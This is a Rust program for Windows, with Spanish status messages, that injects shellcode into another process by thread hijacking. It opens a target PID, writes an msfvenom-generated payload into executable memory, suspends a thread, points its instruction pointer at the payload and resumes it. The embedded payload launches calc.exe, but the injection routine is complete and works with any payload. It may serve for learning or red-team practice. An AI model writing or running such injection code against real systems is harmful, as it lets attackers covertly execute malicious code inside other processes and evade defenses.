use std::ffi::c_void;
use std::mem::{size_of, zeroed};
use std::ptr::{null, null_mut};
use windows_sys::Win32::System::Diagnostics::Debug::{CONTEXT, CONTEXT_FULL_AMD64, GetThreadContext, SetThreadContext};
use windows_sys::Win32::System::Diagnostics::ToolHelp::{CreateToolhelp32Snapshot, TH32CS_SNAPTHREAD, Thread32First, Thread32Next, THREADENTRY32};
use windows_sys::Win32::System::Threading::{OpenProcess, OpenThread, PROCESS_ALL_ACCESS, ResumeThread, SuspendThread, THREAD_ALL_ACCESS};
use windows_sys::Win32::Foundation::FALSE;
use windows_sys::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, VirtualAllocEx};
use windows_sys::Win32::System::Diagnostics::Debug::WriteProcessMemory;

fn main() {
    unsafe {
        // msfvenom -p windows/x64/exec CMD=calc.exe -f rust
        let shellcode: [u8; 276] = [0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,
            0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,
            0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,
            0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,
            0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,
            0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,
            0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,
            0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,
            0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,
            0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,
            0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,
            0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,
            0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,
            0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,
            0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,
            0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,
            0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,
            0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,0x00,
            0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,
            0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,
            0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,
            0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,
            0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,0x63,
            0x2e,0x65,0x78,0x65,0x00];

        let target_pid = 1952; // <--- CHANGE THIS
        let mut thread_hijacked = 0;

        let mut context: CONTEXT = zeroed();
        let mut thread_entry: THREADENTRY32 = zeroed();

        context.ContextFlags = CONTEXT_FULL_AMD64;
        thread_entry.dwSize = size_of::<THREADENTRY32>() as u32;

        let target_process_handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid);
        if target_process_handle == 0 {
            panic!("[!] NO SE PUDO OBTENER UN MANEJADOR.");
        } else {
            println!("[+] MANEJADOR OBTENIDO CON ÉXITO.");
        }

        let remote_buffer = VirtualAllocEx(target_process_handle, null(), shellcode.len(), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        if remote_buffer.is_null() {
            panic!("[!] LA MEMORIA NO PUDO SER ASIGNADA.");
        } else {
            println!("[+] MEMORIA ASIGNADA CON ÉXITO.");
        }

        if WriteProcessMemory(target_process_handle, remote_buffer, shellcode.as_ptr() as *const c_void, shellcode.len(), null_mut()) == 0 {
            panic!("[!] NO SE PUDO ESCRIBIR EL PAYLOAD EN LA MEMORIA.");
        } else {
            println!("[+] PAYLOAD ESCRITO CON ÉXITO EN LA MEMORIA.");
        }

        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
        if snapshot == 0 {
            panic!("[!] NO SE PUDO TOMAR EL SNAPSHOT.");
        } else {
            println!("[+] SNAPSHOT TOMADO CON ÉXITO.");
        }

        if Thread32First(snapshot, &mut thread_entry) != 0 {
            while Thread32Next(snapshot, &mut thread_entry) != 0 {
                if  thread_entry.th32OwnerProcessID == target_pid {
                    thread_hijacked = OpenThread(THREAD_ALL_ACCESS, FALSE, thread_entry.th32ThreadID);
                    if thread_hijacked == 0 {
                        panic!("[!] NO SE PUDO SECUESTRAR NINGÚN HILO.");
                    } else {
                        println!("[+] HILO SECUESTRADO CON ÉXITO.");
                        break
                    }
                }
            }
        };

        if SuspendThread(thread_hijacked) == 0 {
            println!("[+] HILO SUPENDIDO CON ÉXITO.");
        } else {
            panic!("[!] NO SE PUDO SUSPENDER EL HILO.");
        }

        if GetThreadContext(thread_hijacked, &mut context) == 0 {
            let error_code = windows_sys::Win32::Foundation::GetLastError();
            panic!("[!] NO SE PUDO OBTENER INFORMACIÓN DEL HILO. {}", error_code);
        } else {
            println!("[+] INFORMACIÓ DEL HILO OBTENIDA CON ÉXITO.");
            context.Rip = remote_buffer as u64;
        }

        if SetThreadContext(thread_hijacked, &mut context) == 0 {
            panic!("[!] NO SE PUDO ACTUALIZAR EL HILO.");
        } else {
            println!("[+] HILO ACTUALIZADO CON ÉXITO.");
        }

        if ResumeThread(thread_hijacked) == 0 {
            panic!("[!] NO SE PUDO REANUDAR EL HILO.");
        } else {
            println!("[+] HILO REANUDADO CON ÉXITO");
        }

        println!("¡FIN DEL PROGRAMA!");
    }
}